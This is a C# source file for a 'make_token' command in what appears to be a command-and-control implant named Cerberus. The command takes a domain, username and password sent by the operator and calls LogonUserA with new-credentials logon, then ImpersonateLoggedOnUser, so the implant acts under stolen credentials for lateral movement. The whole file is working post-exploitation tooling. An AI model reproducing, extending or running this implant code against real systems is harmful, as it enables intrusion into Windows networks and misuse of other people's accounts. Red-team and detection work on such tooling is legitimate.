using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class MakeToken : CerberusCommand
    {
        public override string Name => "make_token";

        public override string Execute(CerberusTask task)
        {
            var userDomain = task.Arguments[0];
            var password = task.Arguments[1];

            var split = userDomain.Split('\\');
            var domain = split[0];
            var username = split[1];

            var hToken = IntPtr.Zero;

            if (Native.Advapi.LogonUserA(username, domain, password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
                    Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    return $"Successfully impersonated {identity.Name}";
                }

                return $"Successfully made token, but failed to impersonate";
            }

            return "Failed to make token";
        }
    }
}
